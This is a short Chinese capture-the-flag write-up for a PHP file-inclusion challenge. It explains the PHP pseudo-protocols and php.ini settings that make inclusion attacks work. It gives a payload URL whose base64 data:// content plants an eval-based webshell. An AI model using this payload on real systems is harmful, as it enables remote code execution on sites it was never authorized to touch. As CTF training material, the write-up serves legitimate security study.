**题名：**web_php_include
**地址：**攻防世界web高手进阶区第四题

# 解法
这里简单介绍一下php伪协议。这些协议包括file://、php://filter、php://input、zip://、compress.bzip2://、compress.zlib://、data://。
首先需要有使用环境，在PHP.ini里——
allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。
allow_url_include：off  默认关闭，该选项为on便是允许包含URL 对象文件等。
通过文件包含函数加上伪协议，就可以实现协议的特定功能。
file:// 读取绝对地址的文件，不需要环境
php:// 需要开启allow_url_include，在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码（将POST中的内容执行，可以进行RCE，也可以撰写webshell）。
zip:// 不常用一些，使用方法形如zip:\/\/archive.zip#dir/file.txt也即zip:\/\/ \[压缩文件绝对路径\]#\[压缩文件内的子文件名\]
data:// 需要双on，payload形如data:\/\/text/plain;base64,编码后的内容。

本题可以直接利用文件包含漏洞用PHP://input来查看目录，也可以用data://来执行命令或传webshell。
payload类似于：
http://111.198.29.45:35067/?page=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWyJoYWNrIl0pOyA/Pg==
本题还有第四解就有点高端了，暂且不研究。
[参考链接](https://www.cnblogs.com/xhds/p/12218471.html)